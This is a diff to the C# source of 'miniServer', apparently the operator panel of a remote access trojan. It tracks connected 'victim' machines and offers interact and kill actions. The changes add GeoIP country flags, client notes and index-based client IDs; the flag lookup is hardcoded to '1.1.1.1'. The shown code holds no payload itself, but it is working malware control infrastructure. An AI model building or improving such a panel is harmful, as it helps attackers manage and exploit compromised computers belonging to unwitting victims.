@@ -1,5 +1,8 @@
-﻿using System;
+﻿using miniServer.GeoIP;
+using miniServer.Properties;
+using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
@@ -131,7 +134,7 @@ namespace miniServer
         void AddNewClienet(TcpClient tcpClient, string os, string version, string hostName, string incomming)
         {
             idMutex.WaitOne();
-            miniClient mc = new miniClient(Guid.NewGuid(), tcpClient, os, version, hostName);
+            miniClient mc = new miniClient(clientList.Count, tcpClient, os, version, hostName);
             clientList.Add(mc);
             idMutex.ReleaseMutex();
 
@@ -142,7 +145,7 @@ namespace miniServer
             DataGridViewRow row = new DataGridViewRow();
             row.CreateCells(dataGridViewClients);
             //TODO:IP country Flag
-            //row.Cells[0].Value = getFlagOfIP(sc.IP);//IP country Flag
+            row.Cells[0].Value = getFlagOfIP("1.1.1.1");//getFlagOfIP(mc.IP);//IP country Flag
             row.Cells[1].Value = mc.ID;//ID
                                        //Note is emty
             row.Cells[3].Value = mc.IP;//Victim IP and Port
@@ -157,7 +160,7 @@ namespace miniServer
                 dataGridViewClients.Rows.Add(row);
             });
             gridMutex.ReleaseMutex();
-            writelog(mc.IP + " -> Connected :) : " + incomming.Replace(incomming.Split(new string[] { separator }, StringSplitOptions.None)[0],mc.ID.ToString()), "");
+            writelog(mc.IP + " -> Connected :) : " + incomming, "");
         }
 
         void writelog(string log, string extradata)
@@ -172,8 +175,7 @@ namespace miniServer
                 });
                 return;
             }
-            else
-            {
+            else {
                 richTextBoxLog.Invoke((MethodInvoker)delegate
                 {
                     richTextBoxLog.Text += (DateTime.Now.ToString() + " " + log + "\n" + extradata + "\n").Replace(separator, "_");
@@ -198,36 +200,36 @@ namespace miniServer
 
         private void openInteractForm()
         {
-            var client = dataGridViewClients.CurrentRow;
-            if (dataGridViewClients.CurrentCell != null)
+            if(dataGridViewClients.CurrentCell != null)
             {
-                Guid id = (Guid)client.Cells[1].Value;
+                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;
 
-                if (clientList.Where(e=>e.ID==id).FirstOrDefault().Interact)
+                if (clientList[i].Interact)
                 {
-                    // if (disableOpenWarningToolStripMenuItem.Checked)
-                    MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                   // if (disableOpenWarningToolStripMenuItem.Checked)
+                        MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK,MessageBoxIcon.Error);
 
                     foreach (Form frm in Application.OpenForms)
                         if (frm.Name == "InteractForm")
                         {
                             InteractForm intForm = (InteractForm)frm;
-                            if (intForm.mc.ID == id)
+                            if (intForm.mc.ID == i)
                             {
                                 intForm.WindowState = FormWindowState.Normal;
                                 intForm.Focus();
+
 
                                 return;
                             }
                         }
                 }
-                if (!clientList.Where(e=>e.ID==id && e.IsAlive).Any())
+                if (!clientList[i].IsAlive)
                 {
                     if (MessageBox.Show("It seems the client not available, do you want to interact with it?", "Client is not alive", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                         return;
                 }
 
-                InteractForm f = new InteractForm(clientList.Where(e => e.ID == id).FirstOrDefault(), separator);
+                InteractForm f = new InteractForm(clientList[i], separator);
                 f.Show();
             }
 
@@ -236,7 +238,17 @@ namespace miniServer
 
         private void EditNoteToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //TODO: open edit note form
+            if (dataGridViewClients.CurrentCell.RowIndex > -1)
+            {
+                if (dataGridViewClients.CurrentCell != null)
+                {
+                    int i = (int)dataGridViewClients.CurrentRow.Cells["id"].Value;//id
+                    editNoteForm editFrm = new editNoteForm(clientList[i].Note);
+                    editFrm.ShowDialog();
+                    clientList[i].Note = editFrm.note;
+                    dataGridViewClients.CurrentRow.Cells["note"].Value = editFrm.note;
+                }
+            }
         }
 
         private void KillToolStripMenuItem_Click(object sender, EventArgs e)
@@ -318,8 +330,7 @@ namespace miniServer
                         wait++;
                     }
                     throw new Exception(" Don't response to version command.");
-                }
-                catch (Exception ex)
+                }catch(Exception ex)
                 {
                     mc.IsAlive = false;
                     mc.client.Close();
@@ -327,12 +338,7 @@ namespace miniServer
                     gridMutex.WaitOne();
                     dataGridViewClients.Invoke((MethodInvoker)delegate
                     {
-                        int? rowIndex = dataGridViewClients.Rows.
-                                                Cast<DataGridViewRow>().
-                                                Where(r => r.Cells["id"].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault()?.Index;
-                        dataGridViewClients["live", rowIndex.Value].Value = "NO";
-
-
+                        dataGridViewClients["live", mc.ID].Value = "NO";
                     });
                     gridMutex.ReleaseMutex();
 
@@ -343,6 +349,53 @@ namespace miniServer
                     });
                 }
             }
+        }
+
+        /// <summary>
+        /// Cache for flag images to reduce external connections.
+        /// </summary>
+        Dictionary<string, string> flagCache = new Dictionary<string, string>();
+        /// <summary>
+        /// Get ip return country flag
+        /// </summary>
+        /// <param name="ip"></param>
+        /// <returns></returns>
+        private Image getFlagOfIP(string ip)
+        {
+            string country = "xy";
+
+            if (flagCache.ContainsKey(ip))
+            {
+                flagCache.TryGetValue(ip, out country);//read image from cache
+                return (Image)Properties.Resources.ResourceManager.GetObject(country);
+            }
+            if (ip != "127.0.0.1")
+            {
+                GeoLocationHelper geoip = new GeoLocationHelper();
+                geoip.Initialize(ip);
+                country = geoip.GeoInfo.CountryCode;
+                if (country == null)//No country found
+                    country = "xy";
+                else
+                    country = country.ToLower();
+
+                string[] internal_names = new string[] { "as", "do", "in", "is" };
+                if (internal_names.Contains(country))
+                    country = "_" + country;
+            }
+
+            if (!flagCache.ContainsKey(ip))//add to cache
+                flagCache.Add(ip, country);
+            object O = Resources.ResourceManager.GetObject(country);
+            return (Image)O;
+
+            /* other information
+              label1.Text = geoip.GeoInfo.Country;
+            label2.Text = geoip.GeoInfo.City;
+            label3.Text = geoip.GeoInfo.CountryCode;
+            label4.Text = geoip.ImageIndex.ToString();
+             */
+
         }
     }
 }
